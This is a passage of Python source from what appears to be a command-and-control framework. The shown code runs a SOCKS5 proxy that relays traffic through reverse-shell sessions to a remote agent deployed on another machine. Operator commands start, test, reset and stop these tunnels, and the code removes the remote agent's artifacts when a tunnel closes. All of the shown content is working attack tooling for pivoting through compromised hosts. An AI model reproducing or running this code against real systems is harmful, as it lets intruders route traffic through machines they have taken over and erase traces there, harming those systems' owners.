            if not greeting or greeting[0] != 0x05:
                return
            if not self._recv_exact(conn, greeting[1]):
                return
            conn.sendall(b'\x05\x00')

            req = self._recv_exact(conn, 4)
            if not req or req[0] != 0x05 or req[1] != 0x01:
                return
            atyp = req[3]
            if atyp == 0x01:
                b = self._recv_exact(conn, 4)
                host = socket.inet_ntoa(b) if b else None
            elif atyp == 0x03:
                ln = self._recv_exact(conn, 1)
                b = self._recv_exact(conn, ln[0]) if ln else None
                host = b.decode('utf-8', errors='ignore') if b else None
            elif atyp == 0x04:
                b = self._recv_exact(conn, 16)
                host = socket.inet_ntop(socket.AF_INET6, b) if b else None
            else:
                conn.sendall(b'\x05\x08\x00\x01\x00\x00\x00\x00\x00\x00')
                return
            pb = self._recv_exact(conn, 2)
            if not pb or not host:
                return
            port = struct.unpack('!H', pb)[0]

            if self._relay_stale(client_sock, reset_gen):
                conn.sendall(b'\x05\x01\x00\x01\x00\x00\x00\x00\x00\x00')
                return

            sid = self._next_stream_id(client_sock)
            handle = self._register_relay(client_sock, sid)
            tunnel_conn = self._pick_channel(client_sock)
            resp = None
            for _ in range(TUNNEL_POOL_SIZE + 1):
                if not tunnel_conn or self._relay_stale(client_sock, reset_gen):
                    break
                resp, tunnel_conn = self._channel_request(
                    client_sock,
                    {'op': 'connect', 'sid': sid, 'host': host, 'port': port},
                    timeout=45.0,
                    preferred=tunnel_conn,
                )
                if resp and resp.get('ok'):
                    break
                tunnel_conn = self._pick_channel(client_sock)

            if not resp or not resp.get('ok') or self._relay_stale(client_sock, reset_gen):
                err = (resp or {}).get('error', self._last_error or 'no response')
                self._log(client_sock, f"SOCKS connect {host}:{port} failed: {err}")
                conn.sendall(b'\x05\x05\x00\x01\x00\x00\x00\x00\x00\x00')
                return

            conn.sendall(b'\x05\x00\x00\x01' + socket.inet_aton('0.0.0.0') + struct.pack('!H', 0))
            conn.setblocking(False)
            up_conn, down_conn = self._pick_two_channels(client_sock)
            if not up_conn:
                up_conn = tunnel_conn
                down_conn = tunnel_conn
            self._relay(client_sock, up_conn, down_conn, sid, conn, reset_gen, handle)
        except OSError:
            pass
        finally:
            if handle is not None and sid is not None:
                self._unregister_relay(client_sock, sid)
            try:
                conn.close()
            except OSError:
                pass
            if relay_sem is not None:
                relay_sem.release()

    def _stop_proxy(self, proxy_id, reason='operator request', cleanup_remote=True):
        with self._lock:
            proxy = self._proxies.pop(proxy_id, None)
        if not proxy:
            return False

        proxy['stop_event'].set()
        try:
            proxy['listener'].close()
        except OSError:
            pass

        cs = proxy.get('client_sock')
        session_id = proxy.get('session_id')
        print(f"{self.h.colors['yellow']}SOCKS5 {proxy_id} stopped ({reason}){self.h.colors['end']}")

        if cs and cleanup_remote:
            with self._lock:
                remaining = any(p.get('client_sock') == cs for p in self._proxies.values())
            if not remaining:
                ok = self._cleanup_remote_tunnel_artifacts(cs, reason=reason)
                if ok:
                    print(
                        f"{self.h.colors['green']}Remote agent artifact removed for "
                        f"#{session_id}{self.h.colors['end']}"
                    )
                else:
                    print(
                        f"{self.h.colors['yellow']}Warning: could not fully remove remote "
                        f"agent artifact ({self._last_error or 'no response'}){self.h.colors['end']}"
                    )
        return True

    def shutdown_all(self):
        """Stop all SOCKS proxies during server shutdown or restart."""
        for proxy_id in list(self._proxies.keys()):
            self._stop_proxy(proxy_id, reason='server shutdown', cleanup_remote=False)

    def shutdown_for_restart(self):
        """Fast local teardown for process restart — skip remote agent cleanup."""
        for proxy_id in list(self._proxies.keys()):
            self._stop_proxy(proxy_id, reason='server restart', cleanup_remote=False)

        with self._lock:
            sessions = list(self._session_pools.keys())
            listener = self._tunnel_listener
            self._tunnel_listener = None

        if listener is not None:
            try:
                listener.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                listener.close()
            except OSError:
                pass

        for client_sock in sessions:
            self._bump_reset_gen(client_sock)
            self._abort_session_relays(client_sock, timeout=1.0)
            self._drop_pool(client_sock)
            with self._lock:
                agent = self._session_agents.pop(client_sock, None)
                self._active_relays.pop(client_sock, None)
                self._relay_sems.pop(client_sock, None)
                self._deploy_locks.pop(client_sock, None)
                self._session_stream_counters.pop(client_sock, None)
                self._session_reset_gen.pop(client_sock, None)
                if agent:
                    token = agent.get('token')
                    if token:
                        self._token_sessions.pop(token, None)
                        self._channel_ready.pop(token, None)

    def list_tunnels(self):
        proxies = list(self._proxies.values())
        if not proxies:
            print(f"{self.h.colors['yellow']}No active SOCKS proxies{self.h.colors['end']}")
            return
        print(f"{self.h.colors['green']}SOCKS5 proxies:{self.h.colors['end']}")
        for p in proxies:
            alive = p['client_sock'] in self.h.revshell_clients
            n = len(self._alive_conns(p['client_sock']))
            print(f"  {p['id']} session#{p['session_id']} 127.0.0.1:{p['listen_port']} [{n}/{TUNNEL_POOL_SIZE} ch, {'up' if alive else 'orphan'}]")

    def handle_command(self, client_sock, cmd_parts, from_client=False):
        if not cmd_parts:
            return False
        cmd = cmd_parts[0].lower()

        if cmd == 'socks' and len(cmd_parts) >= 2 and cmd_parts[1].lower() == 'reset':
            hard = '--hard' in cmd_parts
            return self._socks_reset(client_sock, hard=hard)

        if cmd == 'socks' and len(cmd_parts) >= 2 and cmd_parts[1].lower() == 'test':
            if len(cmd_parts) < 4:
                print(f"{self.h.colors['red']}Usage: socks test <host> <port>{self.h.colors['end']}")
                return True
            return self._socks_test(client_sock, cmd_parts[2], cmd_parts[3])

        if cmd == 'socks' and len(cmd_parts) >= 2 and cmd_parts[1].lower() == 'stop':
            if self._stop_proxy(cmd_parts[2] if len(cmd_parts) > 2 else ''):
                return True
            print(f"{self.h.colors['red']}Proxy not found{self.h.colors['end']}")
            return True

        if cmd == 'socks':
            if from_client:
                if len(cmd_parts) < 2:
                    print(f"{self.h.colors['red']}Usage: socks <listen_port>{self.h.colors['end']}")
                    print(f"{self.h.colors['cyan']}       socks test <host> <port>{self.h.colors['end']}")
                    print(f"{self.h.colors['cyan']}       socks reset{self.h.colors['end']}")
                    print(f"{self.h.colors['cyan']}       socks stop <proxy_id>{self.h.colors['end']}")
                    return True
                port = cmd_parts[1]
            else:
                port = cmd_parts[2] if len(cmd_parts) > 2 else None
                if not port:
                    print(
                        f"{self.h.colors['red']}Usage: socks <session_id> <listen_port> | "
                        f"socks <session_id> test <host> <port> | "
                        f"socks <session_id> reset{self.h.colors['end']}"
                    )
                    return True
            self.start_socks(client_sock, port)
            return True

        if cmd == 'tunnels':
            self.list_tunnels()
            return True
        return False

    def handle_main_command(self, cmd_parts):
        if not cmd_parts:
            return False
        cmd = cmd_parts[0].lower()
        if cmd == 'tunnels':
            self.list_tunnels()
            return True
        if cmd == 'socks' and len(cmd_parts) >= 3 and cmd_parts[1].lower() == 'stop':
            if self._stop_proxy(cmd_parts[2]):
                return True
            print(f"{self.h.colors['red']}Proxy not found{self.h.colors['end']}")
            return True
        if cmd == 'socks' and len(cmd_parts) >= 3 and cmd_parts[2].lower() == 'stop':
            try:
                session_id = int(cmd_parts[1])
            except ValueError:
                print(f"{self.h.colors['red']}Invalid session ID{self.h.colors['end']}")
                return True
            cs = self.h._get_client_by_id(session_id)
            if not cs:
                print(f"{self.h.colors['red']}Client not active{self.h.colors['end']}")
                return True
            with self._lock:
                owned = [p for p in self._proxies.values()
                        if p.get('client_sock') is cs]
            if not owned:
                print(
                    f"{self.h.colors['yellow']}No SOCKS proxies for "
                    f"session #{session_id}{self.h.colors['end']}"
                )
                return True
            if len(cmd_parts) >= 4:
                proxy_id = cmd_parts[3]
                if not any(p.get('id') == proxy_id for p in owned):
                    print(
                        f"{self.h.colors['red']}Proxy {proxy_id} not found "
                        f"for session #{session_id}{self.h.colors['end']}"
                    )
                    return True
                self._stop_proxy(proxy_id)
            else:
                for p in list(owned):
                    self._stop_proxy(p['id'])
            return True

        if cmd == 'socks' and len(cmd_parts) >= 4 and cmd_parts[2].lower() == 'reset':
            try:
                session_id = int(cmd_parts[1])
            except ValueError:
                print(f"{self.h.colors['red']}Invalid session ID{self.h.colors['end']}")
                return True
            cs = self.h._get_client_by_id(session_id)
            if not cs:
                print(f"{self.h.colors['red']}Client not active{self.h.colors['end']}")
                return True
            hard = '--hard' in cmd_parts
            return self._socks_reset(cs, hard=hard)
        if cmd == 'socks' and len(cmd_parts) >= 5 and cmd_parts[2].lower() == 'test':
            try:
                session_id = int(cmd_parts[1])
            except ValueError:
                print(f"{self.h.colors['red']}Invalid session ID{self.h.colors['end']}")
                return True
            cs = self.h._get_client_by_id(session_id)
            if not cs:
                print(f"{self.h.colors['red']}Client not active{self.h.colors['end']}")
                return True
            return self._socks_test(cs, cmd_parts[3], cmd_parts[4])
        if cmd == 'socks':
            if len(cmd_parts) < 3:
                print(
                    f"{self.h.colors['red']}Usage: socks <session_id> <listen_port> | "
                    f"socks <session_id> test <host> <port> | "
                    f"socks <session_id> reset | "
                    f"socks stop <proxy_id>{self.h.colors['end']}"
                )
                return True
            cs = self.h._get_client_by_id(int(cmd_parts[1]))
            if not cs:
                print(f"{self.h.colors['red']}Client not active{self.h.colors['end']}")
                return True
            return self.handle_command(cs, cmd_parts, from_client=False)
        return False
